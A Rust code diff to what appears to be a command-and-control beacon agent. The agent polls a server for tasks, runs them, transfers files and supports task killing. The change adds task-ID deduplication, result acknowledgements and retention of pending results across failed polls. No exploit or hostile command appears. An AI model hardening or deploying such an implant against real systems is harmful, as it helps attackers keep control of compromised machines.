@@ -1,4 +1,4 @@
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet, VecDeque};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex, RwLock};
 use std::time::Duration;
@@ -53,11 +53,41 @@ pub struct BeaconRuntime {
     session_id: RwLock<Option<Uuid>>,
     key: RwLock<[u8; crypto::KEY_LEN]>,
     pending: Mutex<Vec<TaskResult>>,
+    accepted_task_ids: Mutex<VecDeque<Uuid>>,
+    accepted: Mutex<BoundedIds>,
+    completed: Mutex<BoundedIds>,
     download: RwLock<Option<Download>>,
     upload: RwLock<Option<crate::upload::Upload>>,
     /// task id -> abort handle, for nw/killtask cancellation.
     running: Mutex<HashMap<Uuid, tokio::task::AbortHandle>>,
     stop: AtomicBool,
+}
+
+const TASK_ID_MEMORY_LIMIT: usize = 4096;
+
+#[derive(Default)]
+struct BoundedIds {
+    order: VecDeque<Uuid>,
+    ids: HashSet<Uuid>,
+}
+
+impl BoundedIds {
+    fn contains(&self, id: &Uuid) -> bool {
+        self.ids.contains(id)
+    }
+
+    fn insert(&mut self, id: Uuid) -> bool {
+        if !self.ids.insert(id) {
+            return false;
+        }
+        self.order.push_back(id);
+        while self.order.len() > TASK_ID_MEMORY_LIMIT {
+            if let Some(expired) = self.order.pop_front() {
+                self.ids.remove(&expired);
+            }
+        }
+        true
+    }
 }
 
 impl BeaconRuntime {
@@ -84,6 +114,9 @@ impl BeaconRuntime {
             session_id: RwLock::new(None),
             key: RwLock::new(key),
             pending: Mutex::new(Vec::new()),
+            accepted_task_ids: Mutex::new(VecDeque::new()),
+            accepted: Mutex::new(BoundedIds::default()),
+            completed: Mutex::new(BoundedIds::default()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
             running: Mutex::new(HashMap::new()),
@@ -195,10 +228,14 @@ impl BeaconRuntime {
     /// acks (resume points).
     async fn poll(&self, sid: Uuid) -> Result<Vec<Task>, AnyError> {
         let id = self.next_id();
-        let results: Vec<TaskResult> = {
-            let mut p = self.pending.lock().unwrap();
-            std::mem::take(&mut *p)
-        };
+        let results = self.pending.lock().unwrap().clone();
+        let accepted_task_ids: Vec<Uuid> = self
+            .accepted_task_ids
+            .lock()
+            .unwrap()
+            .iter()
+            .copied()
+            .collect();
 
         // Stream the active download: hand the transport as many chunks as fit
         // this beacon, up to its per-frame inner budget.
@@ -226,7 +263,8 @@ impl BeaconRuntime {
 
         let req = PollRequest {
             results,
-            acked_ids: Vec::new(),
+            acked_ids: accepted_task_ids.clone(),
+            accepted_task_ids: accepted_task_ids.clone(),
             file_chunks,
             upload_acks,
             inner_budget,
@@ -239,6 +277,21 @@ impl BeaconRuntime {
         let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
             .map_err(|e| AnyError(e.to_string()))?;
         let pr: PollReply = serde_json::from_slice(&pt).map_err(|e| AnyError(e.to_string()))?;
+
+        // A successfully decoded reply proves the server received this request.
+        // Retain newer acceptances queued while the exchange was in flight.
+        let sent: HashSet<_> = accepted_task_ids.into_iter().collect();
+        self.accepted_task_ids
+            .lock()
+            .unwrap()
+            .retain(|task_id| !sent.contains(task_id));
+        if !pr.result_acks.is_empty() {
+            let result_acks: HashSet<_> = pr.result_acks.iter().copied().collect();
+            self.pending
+                .lock()
+                .unwrap()
+                .retain(|result| !result_acks.contains(&result.task_id));
+        }
 
         // Apply resume acks and finalize the completed download.
         for ack in pr.acks {
@@ -284,7 +337,25 @@ impl BeaconRuntime {
                 *up = None;
             }
         }
-        Ok(pr.tasks)
+        let mut accepted_now = Vec::new();
+        for task in pr.tasks {
+            let duplicate = self.accepted.lock().unwrap().contains(&task.id)
+                || self.completed.lock().unwrap().contains(&task.id)
+                || self.running.lock().unwrap().contains_key(&task.id)
+                || self
+                    .pending
+                    .lock()
+                    .unwrap()
+                    .iter()
+                    .any(|result| result.task_id == task.id);
+            if duplicate {
+                continue;
+            }
+            self.accepted.lock().unwrap().insert(task.id);
+            self.accepted_task_ids.lock().unwrap().push_back(task.id);
+            accepted_now.push(task);
+        }
+        Ok(accepted_now)
     }
 
     /// Run one returned task, buffering its result for the next poll. Also
@@ -293,6 +364,7 @@ impl BeaconRuntime {
     async fn execute(&self, tasks: &[Task]) {
         for task in tasks {
             self.run_one(task).await;
+            self.completed.lock().unwrap().insert(task.id);
         }
     }
 
@@ -609,8 +681,6 @@ impl BeaconRuntime {
                 }
                 Err(e) => {
                     tracing::warn!("poll failed: {}", e);
-                    *self.session_id.write().unwrap() = None;
-                    self.pending.lock().unwrap().clear();
                 }
             }
             tokio::time::sleep(self.sleep()).await;
